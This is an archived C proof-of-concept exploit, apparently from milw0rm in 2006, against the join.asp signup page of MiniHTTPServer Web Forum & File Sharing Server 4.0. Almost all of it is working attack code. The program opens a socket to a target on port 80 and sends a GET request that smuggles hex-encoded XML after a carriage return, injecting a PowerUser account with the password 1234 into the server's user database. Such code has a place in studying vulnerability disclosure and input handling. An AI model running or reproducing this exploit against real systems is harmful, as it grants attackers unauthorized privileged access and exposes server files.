/*================================================================

MiniHTTPServer.NET 's Web Forum & File Sharing Server Power Pack 4
(latest version available for sale on their website
http://www.minihttpserver.net/bbs/index.php ) has multiple
vulnerabilities with their join.asp page a malicious person could send manipulated data
within the 'FrmMailBox' or 'FrmUserPass' field to add an unverified
account to the system's user database or to manipulate existing users.

This obviously could lead to information leaks on the server,
sensitive information disclosure, or even system access and
compromise.

Discovered 10-25-2006 by Greg Linares
Compiled in LCC-Win32

==================================================================*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

#define MAXBUF  1024

int main(int argc, char *argv[])
{
	/* make sure this lowercase only username here is unique to the server - else exploit fails */

	unsigned char ExploitStart[] =
	"/join.asp?frmUserID=uniquerandomusername&frmUserPass=pwd1234&frmMailBox=me@blah.net";




	unsigned char Exploit[] =
	"\x3c\x2f\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e\x3c"
	"\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x31\x32\x33\x34"
	"\x3c\x2f\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x3c"
	"\x41\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e"
	"\x50\x6f\x77\x65\x72\x55\x73\x65\x72\x3c\x2f\x41"
	"\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e\x3c"
	"\x45\x6d\x61\x69\x6c\x3e\x61\x40\x68\x65\x72\x65"
	"\x2e\x6e\x65\x74";

	WSADATA wsaData;
	char *hostname;
	struct hostent *hp;
	int sockfd, bytes_read;
	struct sockaddr_in sockin;
    char buffer[MAXBUF];
	char Exp[MAXBUF];

	printf("\n=================================================================================\n");
	printf("0-day MiniHTTPServer Web Forum & File Sharing Server 4.0 Add PowerUser Vulnerability \n");
	printf("Proof Of Concept Code and Discovery by Greg Linares <GLinares.Code [At] GMail [Dot] Com\n");
	printf("Exploits: invalid user-input on join.asp Membership Join Page\n");
	printf("Adds a PowerUser - which has full read/write to Level Medium - Low Shares and Forum Editing\n");
	printf("and still able to read all files on High Level shares.\n");
	printf("Reported: Wednesday October 25th 2006\n");
	printf("=================================================================================\n");

    if ( argc != 3 )
	{
    	printf("usage: %s <IP-addr or hostname> <username to add>\n", argv[0]);
		exit(0);
	}


	hostname = argv[1];
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   	{
    	fprintf(stderr, "Error setting up with WinSock v1.1\n");
      	exit(-1);
   	}



	hp = gethostbyname(hostname);
   	if (hp == NULL)
   	{
      	printf("ERROR: Uknown host %s\n", hostname);
	  	printf("%s",hostname);
      	exit(-1);
   	}

   	sockin.sin_family = AF_INET;
   	sockin.sin_port = htons(80);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	printf("ERROR: Socket Error\n");
      	exit(-1);
   	}

   	if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	printf("ERROR: Connect Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	exit(-1);
   	}

   	printf("Connected to [%s] on port [80], sending overflow....\n\n\n",
          hostname);



	memset(Exp, 0, 1024);
	strcat(Exp, ExploitStart);
	/* you can add more \r to create blank lines in the userlist (harder to read) */
	strcat(Exp, "\r");
	strcat(Exp, "\x3c\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e");
   	strcat(Exp, strlwr(argv[2]));
	strcat(Exp, Exploit);


	memset(buffer, 0, 1024);
    sprintf(buffer, "GET %s HTTP/1.0\n\n", Exp);
    send(sockfd, buffer, strlen(buffer), 0);

	/*
	You can re-add this if you want to see the HTTP Response
    do
    {

        bytes_read = recv(sockfd, buffer, sizeof(buffer), 0);
        if ( bytes_read > 0 )
            printf("%s", buffer);
    }
    while ( bytes_read > 0 );
	*/

	printf("Exploit Sent to [%s] \n Login with Username: %s (lowercase) \n Password: 1234\n", hostname, strlwr(argv[2]));
	printf("Any Questions/Comments/Concerns ==> GLinares.Code [at] Gmail [dot] com\n");
	WSACleanup();
    return 0;
}

// milw0rm.com [2006-10-25]
